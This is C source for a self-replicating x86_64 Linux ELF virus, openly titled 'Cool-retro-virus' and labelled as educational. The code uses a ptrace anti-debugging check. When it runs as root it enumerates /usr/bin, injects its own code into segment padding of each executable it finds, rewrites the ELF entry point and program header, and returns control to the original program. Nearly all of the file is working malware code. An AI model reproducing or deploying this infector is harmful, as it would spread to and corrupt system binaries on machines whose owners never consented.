/* -=\ Cool-retro-virus /=-
 * Oldscool ELF infector for fun and for x86_64 systems.
 *
 * Copyright: Robin "marmolak" Hack <hack.robin@gmail.com>
 *
 * EDUCATION PURPOSRES ONLY!
 */

#define SYS_READ	0
#define SYS_WRITE	1
#define SYS_OPEN	2
#define SYS_CLOSE	3
#define SYS_LSEEK	8
#define SYS_EXIT	60
#define SYS_PTRACE	101
#define SYS_GETUID	102
#define SYS_GETDENTS64	217
#define SYS_OPENAT	257


#define _exit(x) 				syscall1(SYS_EXIT, (long)(x))
#define read(fd, buf, len) 			syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
#define write(fd, buf, len) 			syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
#define lseek(fd, offset, origin) 		syscall3(SYS_LSEEK, (long)fd, (long)(offset), (long)origin)
#define open(filename, flags, mode) 		syscall3(SYS_OPEN, (long)(filename), (long)flags, (long)mode)
#define openat(dfd, filename, flags, mode) 	syscall4(SYS_OPENAT, (long)dfd, (long)(filename), (long)flags, (long)mode)
#define close(fd)				syscall1(SYS_CLOSE, fd)
#define ptrace(request, pid, addr, data) 	syscall4(SYS_PTRACE, (long)(request), (long)(pid), (long)(addr), (long)(data))
#define getdents64(dfd, dirent, count) 		syscall3(SYS_GETDENTS64, (long)(dfd), (long)(dirent), (long)count)
#define getuid() 				syscall1(SYS_GETUID, 0)

#define O_RDONLY        0
#define O_RDWR		2

#define SEEK_SET	0
#define SEEK_CUR	1
#define SEEK_END	2

#define AT_FDCWD            -100

/* ELF format start */
#define EI_NIDENT (16)
#define ET_EXEC		2		/* Executable file */
#define PT_LOAD		1		/* Loadable program segment */

#define EM_X86_64	62

typedef unsigned short int	uint16_t;
typedef unsigned int		uint32_t;
typedef int			int32_t;
typedef long int		int64_t;
typedef unsigned long int	uint64_t;

/* Type for a 16-bit quantity.  */
typedef uint16_t Elf64_Half;

/* Types for signed and unsigned 32-bit quantities.  */
typedef uint32_t Elf64_Word;
typedef	int32_t  Elf64_Sword;

/* Types for signed and unsigned 64-bit quantities.  */
typedef uint64_t Elf64_Xword;
typedef	int64_t  Elf64_Sxword;

/* Type of addresses.  */
typedef uint64_t Elf64_Addr;

/* Type of file offsets.  */
typedef uint64_t Elf64_Off;

typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	e_phoff;		/* Program header table file offset */
  Elf64_Off	e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;		/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;		/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */
} Elf64_Ehdr;

typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;

/* ELF format end */

/* ptrace */
#define PTRACE_ME	0

/* Dirent - struct from linux kernel source */
#define O_DIRECTORY  0200000
 struct linux_dirent64 {
	unsigned long	d_ino;
	signed long	d_off;
	unsigned short	d_reclen;
	unsigned char   d_type;
	char		d_name[0];
};

static inline long syscall1(int num, long a1) __attribute__((always_inline));
static inline long syscall1(int num, long a1) 
{
	long ret;
	__asm__ __volatile__ (
		"syscall"
		: "=a" (ret) /* output */
		: "a" (num), "D" (a1) /* input */
	        : /* clobered */
	);
	return ret;
}

static inline long syscall3(int num, long a1, long a2, long a3) __attribute__((always_inline));
static inline long syscall3(int num, long a1, long a2, long a3)
{
	long ret;
	__asm__ __volatile__ (
		"syscall"
		: "=a" (ret) /* output */
		: "a" (num), "D" (a1), "S" (a2), "d" (a3) /* input */
	        : /* clobered */
	);
	return ret;
}

static inline long syscall4(int num, long a1, long a2, long a3, long a4) __attribute__((always_inline));
static inline long syscall4(int num, long a1, long a2, long a3, long a4)
{
	long ret;
	/* really? - gcc folks.. c'mon! */
	/* This section can be fragile in distant future... */
	register long r10 asm("r10") = a4;
	__asm__ __volatile__ (
		"syscall"
		: "=a" (ret) /* output */
		: "a" (num), "D" (a1), "S" (a2), "d" (a3) /* input */
	        : /* clobered */
	);
	return ret;
}

static inline void _memcpy(long src_addr, long dst_addr, long size) __attribute__((always_inline));
static inline void _memcpy(long src_addr, long dst_addr, long size)
{
	long x;
	for(x = 0; x < size; x += 8, src_addr += 8, dst_addr += 8)
	{
		*((long *)dst_addr) = *((long *)src_addr);
	}
}

void _start(void)
{
	__asm__ __volatile__ (
		/* handle stack manually.... yes this is fight agains compiler :( */
		"add $0x83c8, %rsp\n"
		/* This is needed because if I don't do it,
		 * then I will crash to glibc pointer protection.
		 */
		"pushq %rax\n"
		"pushq %rbx\n"
		"pushq %rdx\n"
		"pushq %rcx\n"
		"pushq %rsi\n"
		"pushq %rdi\n"
		"pushq %rbp\n"

		/* allocate spack space for virus */
		"sub $0x83c8, %rsp\n"
	);

	volatile Elf64_Ehdr ehdr;
	volatile Elf64_Phdr phdr;
	volatile Elf64_Phdr phdr_next;
	unsigned long offset;
	unsigned long real_code_size;
	Elf64_Half p;
	unsigned char jmp[27];

	volatile long fd;
	volatile long dfd;

	volatile char buf[32768];
	volatile struct linux_dirent64 *d;
	unsigned long nread;
	unsigned long skip;
	volatile char *file_name;

	/* Primitive anti-debugging technique */
	if (ptrace(PTRACE_ME, 0, 0, 0) == -1) {
		goto label2;
	}

	/* Just one by one.. because this will be
	 * translated to mov instructions inside .text
	 * section.
	 * For more details, look at tail.asm.
	 * PS: comments are in intel syntax assembly */

	/* add rsp, size */
	jmp[0] = '\x48'; 
	jmp[1] = '\x81';
	jmp[2] = '\xc4';
	jmp[3] = '\xc8';
	jmp[4] = '\x83';
	jmp[5] = '\x00';
	jmp[6] = '\x00';

	jmp[7] = '\x5d'; /* pop rbp */
	jmp[8] = '\x5f'; /* pop rdi */
	jmp[9] = '\x5e'; /* pop rsi */
	jmp[10] = '\x59'; /* pop rcx */
	jmp[11] = '\x5a'; /* pop rdx */
	jmp[12] = '\x5b'; /* pop rbx */
	jmp[13] = '\x58'; /* pop rax */

	/* When process starts, entry point address are stored 
	 * in r12 register. Because virus changes entry point address
	 * original entry point address must be put back later. */

	/* mov r12, 0x7777777777777777 */
	jmp[14] = '\x49';
	jmp[15] = '\xbc';
	jmp[16] = '\x77';
	jmp[17] = '\x77';
	jmp[18] = '\x77';
	jmp[19] = '\x77';
	jmp[20] = '\x77';
	jmp[21] = '\x77';
	jmp[22] = '\x77';
	jmp[23] = '\x77';

	/* push r12 */
	jmp[24] = '\x41';
	jmp[25] = '\x54';

	/* retq */
	jmp[26] = '\xc3';

	/* Exploit this for back to loop */
	dfd = -4096;

	/* Count size of _start function of virus */
	real_code_size = (long)&&label2 - (long)&_start;

	/* Hooray! We are root! Go to /usr/bin dir! */
	if (getuid() == 0) {
		buf[0] = '/';
		buf[1] = 'u';
		buf[2] = 's';
		buf[3] = 'r';
		buf[4] = '/';
		buf[5] = 'b';
		buf[6] = 'i';
		buf[7] = 'n';
		buf[8] = '\0';

		dfd = openat(AT_FDCWD, buf, O_RDONLY | O_DIRECTORY, 0);
		if (dfd == -1) {
			goto label2;
		}

//back_to_loop:
		nread = 0;
		while((nread = getdents64(dfd, buf, sizeof(buf))) > 0) {
			for (skip = 0; skip < nread; ) {
				d = (struct linux_dirent64 *)(buf +  skip);
				/* We are, we are ... ugly as hell! */
				if ((d->d_name[0] == '.' && d->d_name[1] == '\0')
					|| (d->d_name[0] == '.' && d->d_name[1] == '.' && d->d_name[2] == '\0'))
					{ skip += d->d_reclen; continue; }
				file_name = d->d_name;
				goto infect;
back_to_loop:
				skip += d->d_reclen;
			}
		}
		close(dfd);
		goto label2;
	}
	goto label2;

infect:
	/* loop: for all elf files in /home/user/bin */
	fd = openat(dfd, file_name, O_RDWR, 0);
	if (fd < 0) {
		goto label2;
	}
	volatile long n = read(fd, &ehdr, sizeof(ehdr));
	if (ehdr.e_ident[0] != 0x7f
	    || ehdr.e_ident[1] != 'E'
	    || ehdr.e_ident[2] != 'L'
	    || ehdr.e_ident[3] != 'F'
	    || ehdr.e_type != ET_EXEC
	    || ehdr.e_machine != EM_X86_64)
	{
		close(fd);
		if (dfd != -4096) { goto back_to_loop; }
		goto label2;
	}

	lseek(fd, ehdr.e_phoff, SEEK_SET);
	for (p = 0; p < (ehdr.e_phnum - 1); ++p) {
		read(fd, &phdr, sizeof(phdr));
		if (phdr.p_type != PT_LOAD) { continue; }

		/* we have match! */
		read(fd, &phdr_next, sizeof(phdr_next));

		if ((phdr_next.p_offset - (phdr.p_offset + phdr.p_filesz) + sizeof(jmp)) < real_code_size) { continue; }

		/* Padding in victim */
		offset = phdr.p_offset + phdr.p_filesz;
		lseek(fd, offset, SEEK_SET);
		/* add code */
		write(fd, (long)_start, real_code_size);

		/* some instructions after label2 are not copyed
		 * so I use this space to add jump... and stack cleanup
		 */
		_memcpy((long)&(ehdr.e_entry), (long)&(jmp[16]), 8);
		write(fd, jmp, sizeof(jmp));

		/* change elf header entry point */
		ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
		lseek(fd, 0, SEEK_SET);
		write(fd, &ehdr, sizeof(ehdr));

		/* change phdr */
		phdr.p_filesz += real_code_size; 
		phdr.p_filesz += sizeof(jmp); 
		phdr.p_memsz += real_code_size;
		phdr.p_memsz += sizeof(jmp); 
		lseek(fd, ehdr.e_phoff + (p * sizeof(phdr)), SEEK_SET);
		write(fd, &phdr, sizeof(phdr));
		break;
	}	
	close(fd);
	if (dfd != -4096) { goto back_to_loop; }
label2: ;
	_exit(0);
}
